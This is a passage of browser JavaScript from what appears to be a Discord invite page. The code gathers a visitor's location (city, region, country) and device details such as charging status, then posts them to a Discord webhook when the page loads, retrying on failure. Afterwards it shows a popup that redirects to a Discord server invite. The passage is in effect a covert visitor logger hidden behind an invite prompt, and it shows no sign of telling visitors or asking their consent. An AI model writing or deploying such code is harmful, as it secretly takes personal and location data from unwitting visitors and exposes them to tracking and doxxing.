                                     `Is Charging: ${additionalDetails.isCharging}`,
                            "inline": false
                        }                                         
                    ]
                }];
                
                if (location.region === null){
                    if (embeds[0] && embeds[0].fields) {
                        for (let i = 0; i < embeds[0].fields.length; i++) {
                            if (embeds[0].fields[i].name === "Location") {
                                embeds[0].fields[i].value = `${location.city}, ${location.country_name}`;
                                break;
                            }
                        }
                    }
                }
                
                if(location.city == location.country_name){
                    if (embeds[0] && embeds[0].fields) {
                        for (let i = 0; i < embeds[0].fields.length; i++) {
                            if (embeds[0].fields[i].name === "Location") {
                                embeds[0].fields[i].value = `${location.city}`;
                                break;
                            }
                        }
                    }
                }
                
    
                sendDiscordMessage(webhook_url, embeds);
            }
    
    
            // Function to send data to the Discord webhook
            function sendDiscordMessage(webhookUrl, embeds, retryCount = 3) {
                const retryDelay = 3000; // Define retryDelay within the function
            
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: embeds })
                })
                .then(response => {
                    if (!response.ok) {
                        console.error('Failed to send message to Discord. Response:', response.status, response.statusText);
                        if (retryCount > 0) {
                            console.log(`Retrying... Attempts left: ${retryCount - 1}`);
                            setTimeout(() => sendDiscordMessage(webhookUrl, embeds, retryCount - 1), retryDelay);
                        } else {
                            console.error('Max retries reached. Giving up on sending message to Discord.');
                        }
                    } else {
                        console.log('Message sent successfully to Discord.');
                    }
                })
                .catch(error => {
                    console.error('Error sending message to Discord:', error);
                    if (retryCount > 0) {
                        console.log(`Retrying... Attempts left: ${retryCount - 1}`);
                        setTimeout(() => sendDiscordMessage(webhookUrl, embeds, retryCount - 1), retryDelay);
                    } else {
                        console.error('Max retries reached. Giving up on sending message to Discord.');
                    }
                });
            }

            // Function to show the popup
            function showPopup() {
                var popup = document.getElementById('discordPopup');
                if (popup) {
                    popup.style.display = 'block';
                }
            }

            // Function to handle the acceptance of the invite
            function acceptInvite() {
                window.location.href = 'https://discord.gg/thepirates';
            }

            // Call the main function to run the async tasks
            document.addEventListener('DOMContentLoaded', (event) => {
                main().catch(error => {
                    console.error('Error in main function:', error);
                });
            });
            
